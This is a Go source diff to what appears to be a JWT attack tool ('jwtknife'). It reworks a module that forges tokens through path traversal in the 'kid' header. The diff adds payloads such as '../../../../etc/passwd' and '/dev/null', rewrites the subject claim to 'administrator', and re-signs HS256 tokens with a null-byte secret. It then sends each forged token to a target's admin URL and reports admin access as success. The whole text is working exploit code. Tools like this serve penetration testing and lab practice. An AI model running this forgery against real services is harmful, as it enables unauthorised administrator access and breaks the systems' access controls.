@@ -1,21 +1,24 @@
 package jwt
 
 import (
+	"encoding/base64"
 	"fmt"
+
+	jwtlib "github.com/golang-jwt/jwt/v5"
 
 	"jwtknife/internal/httpx"
 	"jwtknife/internal/jwtknifejwt"
 	"jwtknife/internal/report"
 )
 
-var linuxKidPaths = []string{
+var autoKidPaths = []string{
 	"../../../../../../../dev/null",
 	"../../../../../../../etc/passwd",
-}
-
-var windowsKidPaths = []string{
 	"..\\..\\..\\..\\..\\..\\..\\NUL",
 	"..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
+	"../key",
+	"../../key",
+	"/dev/null",
 }
 
 type kidTraversal struct{}
@@ -35,39 +38,72 @@ func (kidTraversal) Run(in AttackInput) report.AttackResult {
 		return ar
 	}
 
-	paths := append(linuxKidPaths, windowsKidPaths...)
+	// Decide payloads
+	var payloads []string
+	if in.CustomKID != "" {
+		payloads = []string{in.CustomKID}
+		ar.Note = "custom kid value used"
+	} else {
+		payloads = autoKidPaths
+	}
 
-	for _, path := range paths {
-		mod, err := mutateHeaderOnly(in.RawJWT, "kid", path)
+	for _, kidVal := range payloads {
+		p, err := jwtknifejwt.Parse(in.RawJWT)
 		if err != nil {
 			ar.Errors = append(ar.Errors, err.Error())
 			continue
 		}
 
-		r := in.Client.Do(httpx.RequestPlan{
-			Label:     "atk-kid-traversal",
-			URL:       in.Targets.AdminURL,
-			Method:    "GET",
-			JWT:       mod,
-			Placement: in.Targets.Placement,
-		})
+		p.Header["kid"] = kidVal
+		p.Payload["sub"] = "administrator"
+
+		var mod string
+
+		// Lab-style HS256 resign using null-byte secret
+		if p.Alg == "HS256" {
+			secret, _ := base64.StdEncoding.DecodeString("AA==")
+			tok := jwtlib.NewWithClaims(jwtlib.SigningMethodHS256, jwtlib.MapClaims(p.Payload))
+			for k, v := range p.Header {
+				tok.Header[k] = v
+			}
+			mod, err = tok.SignedString(secret)
+		} else {
+			mod, err = jwtknifejwt.Rebuild(p)
+		}
+
+		if err != nil {
+			ar.Errors = append(ar.Errors, err.Error())
+			continue
+		}
 
 		step := report.Step{
 			Label:   "kid-traversal",
-			Details: fmt.Sprintf("kid=%s", path),
-			HTTP:    report.FromHTTPResult(r),
+			Details: fmt.Sprintf("kid=%s", kidVal),
 			JWT:     report.JWTInfo{Token: mod},
 		}
-		ar.Steps = append(ar.Steps, step)
 
-		if report.IsAdminSuccess(in.Baseline, step.HTTP) {
-			ar.Outcome = report.OutcomeSuccess
-			ar.Note = "admin access achieved via kid path traversal"
-			return ar
+		if in.Client != nil && in.Targets.AdminURL != "" {
+			r := in.Client.Do(httpx.RequestPlan{
+				Label:     "atk-kid-traversal",
+				URL:       in.Targets.AdminURL,
+				Method:    in.Targets.Method,
+				JWT:       mod,
+				Placement: in.Targets.Placement,
+			})
+			step.HTTP = report.FromHTTPResult(r)
+
+			if report.IsAdminSuccess(in.Baseline, step.HTTP) {
+				ar.Steps = append(ar.Steps, step)
+				ar.Outcome = report.OutcomeSuccess
+				ar.Note = "admin access achieved via kid path traversal (token is NOT reusable; exploit relies on filesystem key lookup side-effect)"
+				return ar
+			}
+			if report.IsInteresting(in.Baseline, step.HTTP) {
+				ar.Outcome = report.OutcomeInteresting
+			}
 		}
-		if report.IsInteresting(in.Baseline, step.HTTP) {
-			ar.Outcome = report.OutcomeInteresting
-		}
+
+		ar.Steps = append(ar.Steps, step)
 	}
 
 	if ar.Outcome == "" {
